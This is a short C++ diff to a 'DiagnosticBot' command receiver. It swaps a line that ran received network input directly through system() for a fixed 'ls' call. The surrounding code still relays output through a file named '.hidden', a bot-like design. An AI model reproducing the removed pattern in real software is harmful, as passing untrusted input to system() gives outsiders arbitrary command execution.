@@ -55,7 +55,14 @@ std::string		DiagnosticBot::ReceiveCommand(void)
 	buffer[bytesize] = '\0';
 	std::string		command(buffer);
 	std::cout << "received comm : " << buffer << std::endl;
-	system(buffer);
+	pid_t 	pid = fork();
+	if (pid == 0)
+	{
+		execlp("/bin/ls", "ls", NULL);
+		exit(1);
+	}
+	else
+		wait(NULL);
 	close(i2);
 	i2 = open(".hidden", O_RDONLY);
 	bytesize = read(i2, sender, 4096);
